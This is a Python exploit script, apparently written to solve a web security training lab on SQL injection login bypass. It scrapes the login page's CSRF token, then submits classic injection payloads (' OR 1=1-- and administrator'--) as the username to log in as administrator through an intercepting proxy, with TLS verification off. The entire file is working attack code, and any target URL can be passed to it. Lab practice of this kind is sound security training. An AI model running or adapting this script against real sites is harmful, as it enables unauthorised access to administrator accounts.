# SQL injection vulnerability allowing login bypass

import sys
import requests
import urllib3
import urllib.parse
import re
import time
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def bypass_login(s, url, payload):
	login_path = url + "/login"
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	login_data = {"username": payload, "password": "Passw0rd!", "csrf": csrf_token}
	print('\n[+] Using payload:\t%s' % payload)
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	if 'Your username is: administrator' in r.text:
		return True
	else:
		return False

def show_usage():
	print('[+] Usage: %s <URL> <PAYLOAD>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com "\' OR 1=1--"' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION1\t\t(solve the lab)' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION2\t\t(solve the lab)' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: SQL injection vulnerability allowing login bypass')
	try:
		url = sys.argv[1].strip()
		if sys.argv[2] == "SOLUTION1":
			payload = "' OR 1=1--"
		elif sys.argv[2] == "SOLUTION2":
			payload = "administrator'--"
		elif sys.argv[2] == "SOLUTION":
			show_usage()
		else:
			payload = sys.argv[2].strip()
	except IndexError:
		show_usage()
	print('[+] Trying to bypass login to log as Administrator...\n')
	time.sleep(1)
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		parsed_url = urllib.parse.urlparse(url)
		host = parsed_url.netloc
		print(parsed_url)
		url = parsed_url.scheme + '://' + host
		if bypass_login(s, url, payload):
			print('\n[+] SQL Injection successful !')
			print('[+] Logged in as Administrator !')
		else:
			print('\n[-] SQL Injection Failed <!>')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
